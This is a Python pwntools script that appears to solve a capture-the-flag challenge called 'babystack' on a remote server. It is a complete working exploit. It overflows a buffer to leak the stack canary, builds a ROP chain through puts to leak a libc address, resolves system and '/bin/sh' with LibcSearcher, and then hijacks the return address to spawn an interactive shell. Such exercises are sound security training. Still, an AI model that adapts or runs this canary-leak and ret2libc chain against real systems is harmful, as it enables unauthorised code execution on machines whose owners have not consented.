from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 56617)
e = ELF('./babystack')
 
def get_info():
	info = io.recvline()
	return info
 
def store_info(payload):
	io.sendlineafter(b'>> ', b'1')
	io.sendline(payload)
	return get_info()
 
 
def print_info():
	io.sendlineafter(b'>> ', b'2')
	return get_info()
 
#leak canary
payload = b'a'*0x88
store_info(payload)
print_info()
canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("canary => %#x", canary)

# leak libcbase_address 
pop_rdi = 0x400a93
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_address = 0x400908
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.info("puts_address => %#x", puts_address)
libc = LibcSearcher('puts', puts_address)  # libc6_2.23-0ubuntu10_amd64
libcbase = puts_address - libc.dump('puts')

# get shell
system_address = libcbase + libc.dump('system')
log.success("system_address => %#x", system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success("binsh_address => %#x", bin_sh_address)
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, bin_sh_address, system_address, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
io.interactive()